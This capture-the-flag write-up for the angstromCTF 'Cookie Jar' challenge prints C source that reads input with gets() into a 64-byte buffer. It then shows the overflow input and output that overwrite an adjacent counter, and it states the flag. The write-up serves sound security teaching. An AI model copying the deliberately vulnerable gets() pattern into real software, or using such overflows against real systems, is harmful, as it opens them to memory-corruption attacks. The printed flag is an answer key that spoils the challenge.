# Cookie Jar - 60 points

Note: Binary has been updated Try to break this [Cookie Jar](./cookiePublic64) that was compiled from this [source](./cookiePublic.c). Once you've pwned the binary, test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

Hint:
Look up some vulnerabilities associated with buffers.

### Solution
###### Writeup by asinggih

In order to get the flag, we need to have at least 100 cookies inside the cookie jar. However, if we input 100, it will say that we only have 0 cookies in the jar. 


```sh
❯ ./cookiePublic64 
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
100
Sorry, you only had 0 cookies, try again!

```

To find a way around it, we need to look at the source code provided.

```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG "----------REDACTED----------" 


int main(int argc, char **argv){
  
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int numCookies = 0;

	char buffer[64];

	puts("Welcome to the Cookie Jar program!\n");
	puts("In order to get the flag, you will need to have 100 cookies!\n");
	puts("So, how many cookies are there in the cookie jar: ");
	fflush(stdout);
	gets(buffer);

	if (numCookies >= 100){
		printf("Congrats, you have %d cookies!\n", numCookies);
		printf("Here's your flag: %s\n", FLAG);
	} else {
		printf("Sorry, you only had %d cookies, try again!\n",numCookies);
	}
		
	return 0;
}

```
From the source code, we can see that:

* Input is being stored inside a ```char``` array variable called ```buffer```, which can hold values up to 64 bytes. 
* The cookies are stored inside an ```int``` variable called ```numCookies```, which has a default value of ```0```. 
* We can get the <b>Flag</b> when ```numCookies >= 100``` 
* However, there's no direct relation between our input which is stored in the ```buffer``` and ```numCookies```. We need to work our way around this!

The hint suggests to find buffer overflow vulnerabilities, and I did. In our case, we can exploit buffer overflow by inserting values greater than what the allocated buffer can handle (in this case the ```buffer``` array with a size of ```64```). Buffer overflow may be used to overwrite local variable located near the vulnerable buffer on the stack. In our case, this is the ```numCookies```. 

As I have mentioned earlier, we can obtain the <b>Flag</b> when ```numCookes >= 100```. I did several attempts.

* First attempt, filling up the buffer with 65  ```b```s. No luck. This is quite weird for me, since it is already greater than 64. 
	```sh
	❯ python -c 'print ("b"*65)' | ./cookiePublic64 
	Welcome to the Cookie Jar program!

	In order to get the flag, you will need to have 100 cookies!

	So, how many cookies are there in the cookie jar: 
	Sorry, you only had 0 cookies, try again!
	```

* I kept incrementing the numbers, and finally the cookie jar starts filling up at 73. 
	```sh
	❯ python -c 'print ("b"*73)' | ./cookiePublic64 
	Welcome to the Cookie Jar program!

	In order to get the flag, you will need to have 100 cookies!

	So, how many cookies are there in the cookie jar: 
	Sorry, you only had 98 cookies, try again!

	```
* At 74, I managed to fill the cookie jar according to the requirements and obtain the flag.
	```sh
	❯ python -c 'print ("b"*74)' | ./cookiePublic64
	Welcome to the Cookie Jar program!

	In order to get the flag, you will need to have 100 cookies!

	So, how many cookies are there in the cookie jar: 
	Congrats, you have 25186 cookies!
	Here's your flag: actf{eat_cookies_get_buffer} '
	```

Note: 
The reason behind 65 ```'b'```s not doing the trick might be due to not enough overflow to overwrite the ```numCookies``` variable (I'm just guessing here). 73 ```'b'```s is the point where the overflow overwrites ```numCookies```, and 74 ```'b'```s overwrite enough values to fulfill the if condition. Look at illustration below: 

```
			       / ----- 	|-----------------------| ---\
			      /	        |    	   0	        |     \
			     / 		|-----------------------|      \
			    /		|	   0		|	\
4 bytes int numCookies <----		|-----------------------|	  ----> Concatenate the bytes 0110001001100010
			    \		|   'b' == 0b1100010	|	 /	 which converts to 25186 in decimal
			     \		|-----------------------|	/
			      \		|   'b' == 0b1100010	|      /
				\ ----	|-----------------------| ----/
					|			|
					| Location of something |
					|	????		|
				/ ----	|-----------------------| 
			       /	|			| 
			      /		|    Location of	| 
    64 bytes char buffer <----		|     char buffer 	| 
			      \		|  (now full of 'b's)	| 
			       \	|			| 
				\ ----	|-----------------------| 
					|	0x???????	| ----------> Return address of next function
					|-----------------------|
					|			|
					|	  ....		|
					|-----------------------|
						0xFFFFF

```
## Flag
>actf{eat_cookies_get_buffer}



